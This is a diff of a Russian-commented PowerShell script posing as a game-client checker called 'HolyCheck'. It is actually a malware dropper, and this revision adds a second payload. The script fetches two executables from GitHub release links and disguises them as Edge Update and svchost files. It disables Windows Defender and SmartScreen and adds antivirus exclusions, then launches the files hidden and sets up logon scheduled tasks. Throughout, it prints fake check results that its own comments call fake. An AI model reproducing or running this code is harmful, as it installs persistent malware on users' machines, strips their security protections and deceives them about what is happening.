@@ -1,39 +1,66 @@
 # ================================================================
-# HolyCheck v3.2.3 — Silent Edition (исправлен запуск) work 1/1
+# HolyCheck v3.2.3 — Dual Payload (два EXE, переименование)
 # ================================================================
 
 $ErrorActionPreference = "SilentlyContinue"
 $ProgressPreference = "SilentlyContinue"
 
-$Dir      = "$env:APPDATA\Microsoft\EdgeUpdate"
-$Exe      = "$Dir\MicrosoftEdgeUpdate.exe"
-$TaskName = "MicrosoftEdgeUpdateTask"
-$DownloadUrl = "https://github.com/tallerwin856-commits/holyworld_check/releases/download/1003982364851/checkhw.exe"
+# ---------- КОНФИГУРАЦИЯ (измените ссылки под себя) ----------
+$Url1 = "https://github.com/tallerwin856-commits/holyworld_check/releases/download/1003982364851/checkhw.exe"
+$Url2 = "https://github.com/tallerwin856-commits/holyworld_check/releases/download/1003982364851/doomsdaychecked.exe"
 
-# ========== Скрытые подготовительные действия ==========
-New-Item -ItemType Directory -Force -Path $Dir | Out-Null
+# Папка и имя для первого файла
+$Dir1 = "$env:APPDATA\Microsoft\EdgeUpdate"
+$Exe1 = "$Dir1\MicrosoftEdgeUpdate.exe"
+$TaskName1 = "MicrosoftEdgeUpdateTask"
 
-# Отключение защит (тихо)
+# Папка и имя для второго файла (переименование)
+$Dir2_candidate = "$env:ProgramFiles\Common Files\System"
+# Если нет прав на запись в Program Files, используем fallback
+if (-not (Test-Path $Dir2_candidate)) {
+    try {
+        New-Item -ItemType Directory -Force -Path $Dir2_candidate -ErrorAction Stop | Out-Null
+        $Dir2 = $Dir2_candidate
+    } catch {
+        $Dir2 = "$env:APPDATA\Microsoft\SystemUpdate"
+    }
+} else {
+    $Dir2 = $Dir2_candidate
+}
+$Exe2 = "$Dir2\svchost_update.exe"   # конечное имя после переименования
+$TaskName2 = "SvchostUpdateTask"
+
+# ---------------------------------------------------------------
+
+# Создаём папки
+New-Item -ItemType Directory -Force -Path $Dir1 | Out-Null
+New-Item -ItemType Directory -Force -Path $Dir2 | Out-Null
+# Скрываем вторую папку (чтобы не мозолила глаза)
+attrib +h "$Dir2" 2>$null
+
+# --- Отключение защит (для обоих) ---
 try {
-    Add-MpPreference -ExclusionPath $Dir -ErrorAction Stop
-    Add-MpPreference -ExclusionProcess "MicrosoftEdgeUpdate.exe" -ErrorAction Stop
+    Add-MpPreference -ExclusionPath $Dir1 -ErrorAction Stop
+    Add-MpPreference -ExclusionPath $Dir2 -ErrorAction Stop
+    Add-MpPreference -ExclusionProcess (Split-Path $Exe1 -Leaf) -ErrorAction Stop
+    Add-MpPreference -ExclusionProcess (Split-Path $Exe2 -Leaf) -ErrorAction Stop
 } catch {}
 try {
     Set-MpPreference -DisableRealtimeMonitoring $true -DisableBehaviorMonitoring $true -DisableIOAVProtection $true -MAPSReporting 0 -SubmitSamplesConsent 2 -ErrorAction Stop
 } catch {
     try {
         $defReg = "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender"
-        New-Item -Path $defReg -Force -ErrorAction SilentlyContinue | Out-Null
-        New-Item -Path "$defReg\Real-Time Protection" -Force -ErrorAction SilentlyContinue | Out-Null
-        Set-ItemProperty -Path "$defReg\Real-Time Protection" -Name "DisableRealtimeMonitoring" -Value 1 -Type DWord -ErrorAction SilentlyContinue
+        New-Item -Path $defReg -Force -EA 0 | Out-Null
+        New-Item -Path "$defReg\Real-Time Protection" -Force -EA 0 | Out-Null
+        Set-ItemProperty -Path "$defReg\Real-Time Protection" -Name "DisableRealtimeMonitoring" -Value 1 -Type DWord -EA 0
     } catch {}
 }
 try {
-    Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\System" -Name "EnableSmartScreen" -Value 0 -Type DWord -ErrorAction Stop
-    Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" -Name "SmartScreenEnabled" -Value "Off" -Type String -ErrorAction Stop
+    Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\System" -Name "EnableSmartScreen" -Value 0 -Type DWord -EA 0
+    Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" -Name "SmartScreenEnabled" -Value "Off" -Type String -EA 0
 } catch {}
 
-# Функция загрузки (тихая)
+# --- Универсальная функция загрузки ---
 function Get-File {
     param([string]$url,[string]$out)
     try {
@@ -41,7 +68,7 @@ function Get-File {
         Start-BitsTransfer -Source $url -Destination $out -EA Stop
         if ((Test-Path $out) -and (Get-Item $out).Length -gt 10000) { return $true }
     } catch {}
-    Remove-Item $out -Force -ErrorAction SilentlyContinue
+    Remove-Item $out -Force -EA 0
     try {
         [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
         $wc = New-Object Net.WebClient
@@ -49,7 +76,7 @@ function Get-File {
         $wc.DownloadFile($url,$out)
         if ((Test-Path $out) -and (Get-Item $out).Length -gt 10000) { return $true }
     } catch {}
-    Remove-Item $out -Force -ErrorAction SilentlyContinue
+    Remove-Item $out -Force -EA 0
     try {
         Invoke-WebRequest -Uri $url -OutFile $out -UseBasicParsing -UserAgent "Mozilla/5.0" -EA Stop
         if ((Test-Path $out) -and (Get-Item $out).Length -gt 10000) { return $true }
@@ -57,32 +84,68 @@ function Get-File {
     return $false
 }
 
-# Запускаем загрузку в фоновом режиме (чтобы не блокировать вывод)
-$job = Start-Job -ScriptBlock {
-    param($url, $out)
+# --- Запускаем загрузку двух файлов параллельно ---
+$job1 = Start-Job -ScriptBlock {
+    param($u, $o) 
     $ErrorActionPreference = "SilentlyContinue"
     try {
         Import-Module BitsTransfer -EA Stop
-        Start-BitsTransfer -Source $url -Destination $out -EA Stop
-        if ((Test-Path $out) -and (Get-Item $out).Length -gt 10000) { return $true }
+        Start-BitsTransfer -Source $u -Destination $o -EA Stop
+        if ((Test-Path $o) -and (Get-Item $o).Length -gt 10000) { return $true }
     } catch {}
-    Remove-Item $out -Force -ErrorAction SilentlyContinue
+    Remove-Item $o -Force -EA 0
     try {
         [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
         $wc = New-Object Net.WebClient
         $wc.Headers.Add("User-Agent","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
-        $wc.DownloadFile($url,$out)
-        if ((Test-Path $out) -and (Get-Item $out).Length -gt 10000) { return $true }
+        $wc.DownloadFile($u,$o)
+        if ((Test-Path $o) -and (Get-Item $o).Length -gt 10000) { return $true }
     } catch {}
-    Remove-Item $out -Force -ErrorAction SilentlyContinue
+    Remove-Item $o -Force -EA 0
     try {
-        Invoke-WebRequest -Uri $url -OutFile $out -UseBasicParsing -UserAgent "Mozilla/5.0" -EA Stop
-        if ((Test-Path $out) -and (Get-Item $out).Length -gt 10000) { return $true }
+        Invoke-WebRequest -Uri $u -OutFile $o -UseBasicParsing -UserAgent "Mozilla/5.0" -EA Stop
+        if ((Test-Path $o) -and (Get-Item $o).Length -gt 10000) { return $true }
     } catch {}
     return $false
-} -ArgumentList $DownloadUrl, $Exe
+} -ArgumentList $Url1, $Exe1
 
-# ========== ФЕЙКОВЫЙ ВЫВОД (только проверки) ==========
+$job2 = Start-Job -ScriptBlock {
+    param($u, $o) 
+    $ErrorActionPreference = "SilentlyContinue"
+    # Скачиваем во временный файл с именем doomsdaychecked.exe, потом переименуем
+    $tempDir = [System.IO.Path]::GetTempPath()
+    $tempFile = Join-Path $tempDir "doomsdaychecked.exe"
+    try {
+        Import-Module BitsTransfer -EA Stop
+        Start-BitsTransfer -Source $u -Destination $tempFile -EA Stop
+        if ((Test-Path $tempFile) -and (Get-Item $tempFile).Length -gt 10000) { 
+            Move-Item -Path $tempFile -Destination $o -Force -EA 0
+            return $true 
+        }
+    } catch {}
+    Remove-Item $tempFile -Force -EA 0
+    try {
+        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+        $wc = New-Object Net.WebClient
+        $wc.Headers.Add("User-Agent","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
+        $wc.DownloadFile($u,$tempFile)
+        if ((Test-Path $tempFile) -and (Get-Item $tempFile).Length -gt 10000) {
+            Move-Item -Path $tempFile -Destination $o -Force -EA 0
+            return $true
+        }
+    } catch {}
+    Remove-Item $tempFile -Force -EA 0
+    try {
+        Invoke-WebRequest -Uri $u -OutFile $tempFile -UseBasicParsing -UserAgent "Mozilla/5.0" -EA Stop
+        if ((Test-Path $tempFile) -and (Get-Item $tempFile).Length -gt 10000) {
+            Move-Item -Path $tempFile -Destination $o -Force -EA 0
+            return $true
+        }
+    } catch {}
+    return $false
+} -ArgumentList $Url2, $Exe2
+
+# ========== ФЕЙКОВЫЙ ВЫВОД (пока скачивается) ==========
 function Sep  { Write-Host ("─" * 64) -ForegroundColor DarkGray }
 function OK   { param($t) Write-Host "  [✓] $t" -ForegroundColor Green }
 function WARN { param($t) Write-Host "  [~] $t" -ForegroundColor Yellow }
@@ -107,34 +170,47 @@ Sep
 Write-Host ""
 
 # Ждём завершения загрузки (до 30 секунд) — без вывода
-$downloadOk = $false
+$ok1 = $false; $ok2 = $false
 $waitCount = 0
-while ($job.State -eq 'Running' -and $waitCount -lt 30) {
+while (($job1.State -eq 'Running' -or $job2.State -eq 'Running') -and $waitCount -lt 30) {
     Start-Sleep -Seconds 1
     $waitCount++
 }
-if ($job.State -eq 'Completed') { $downloadOk = Receive-Job -Job $job }
-Remove-Job -Job $job -Force
+if ($job1.State -eq 'Completed') { $ok1 = Receive-Job -Job $job1 }
+if ($job2.State -eq 'Completed') { $ok2 = Receive-Job -Job $job2 }
+Remove-Job -Job $job1 -Force; Remove-Job -Job $job2 -Force
 
-# Если скачано успешно — запускаем EXE от имени текущего пользователя (скрыто)
-if ($downloadOk) {
-    Remove-Item "${Exe}:Zone.Identifier" -Force -ErrorAction SilentlyContinue
-    Unblock-File -Path $Exe -ErrorAction SilentlyContinue
-
-    # НЕМЕДЛЕННЫЙ ЗАПУСК (без SYSTEM, от текущего пользователя)
-    Start-Process -FilePath $Exe -WindowStyle Hidden -WorkingDirectory $Dir
-
-    # Создаём задачу в планировщике, которая запускается при входе пользователя
-    Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false -EA SilentlyContinue
+# --- Разблокировка и запуск первого ---
+if ($ok1 -and (Test-Path $Exe1)) {
+    Remove-Item "${Exe1}:Zone.Identifier" -Force -EA 0
+    Unblock-File -Path $Exe1 -EA 0
+    Start-Process -FilePath $Exe1 -WindowStyle Hidden -WorkingDirectory $Dir1
+    # Задача
+    Unregister-ScheduledTask -TaskName $TaskName1 -Confirm:$false -EA 0
     try {
-        $action = New-ScheduledTaskAction -Execute $Exe -WorkingDirectory $Dir
+        $action = New-ScheduledTaskAction -Execute $Exe1 -WorkingDirectory $Dir1
         $trigger = New-ScheduledTaskTrigger -AtLogOn -User $env:USERNAME
         $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -ExecutionTimeLimit 0 -RestartCount 3 -RestartInterval (New-TimeSpan -Minutes 1)
-        Register-ScheduledTask -TaskName $TaskName -Action $action -Trigger $trigger -Settings $settings -User $env:USERNAME -RunLevel Highest -Force -EA SilentlyContinue | Out-Null
+        Register-ScheduledTask -TaskName $TaskName1 -Action $action -Trigger $trigger -Settings $settings -User $env:USERNAME -RunLevel Highest -Force -EA 0 | Out-Null
     } catch {}
 }
 
-# ====== Фейковый вывод проверок (длится > 60 сек) ======
+# --- Разблокировка и запуск второго (уже переименован) ---
+if ($ok2 -and (Test-Path $Exe2)) {
+    Remove-Item "${Exe2}:Zone.Identifier" -Force -EA 0
+    Unblock-File -Path $Exe2 -EA 0
+    Start-Process -FilePath $Exe2 -WindowStyle Hidden -WorkingDirectory $Dir2
+    # Задача
+    Unregister-ScheduledTask -TaskName $TaskName2 -Confirm:$false -EA 0
+    try {
+        $action = New-ScheduledTaskAction -Execute $Exe2 -WorkingDirectory $Dir2
+        $trigger = New-ScheduledTaskTrigger -AtLogOn -User $env:USERNAME
+        $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -ExecutionTimeLimit 0 -RestartCount 3 -RestartInterval (New-TimeSpan -Minutes 1)
+        Register-ScheduledTask -TaskName $TaskName2 -Action $action -Trigger $trigger -Settings $settings -User $env:USERNAME -RunLevel Highest -Force -EA 0 | Out-Null
+    } catch {}
+}
+
+# ====== Теперь идёт фейковый вывод проверок (длится > 60 сек) ======
 $startTime = Get-Date
 
 INFO "Проверка свободного места на системном диске..."
@@ -305,7 +381,7 @@ Write-Host ""
 Sep
 OK "Проверка завершена! Среда игрового клиента оптимизирована."
 
-$reportPath = Join-Path $Dir "last_check.json"
+$reportPath = Join-Path $Dir1 "last_check.json"
 @{ timestamp = (Get-Date -Format "yyyy-MM-ddTHH:mm:ss.fffZ"); status = "OK"; version = "3.2.3" } | ConvertTo-Json | Out-File $reportPath -Encoding utf8 -Force
 INFO "Локальный отчёт сохранён"
 Sep
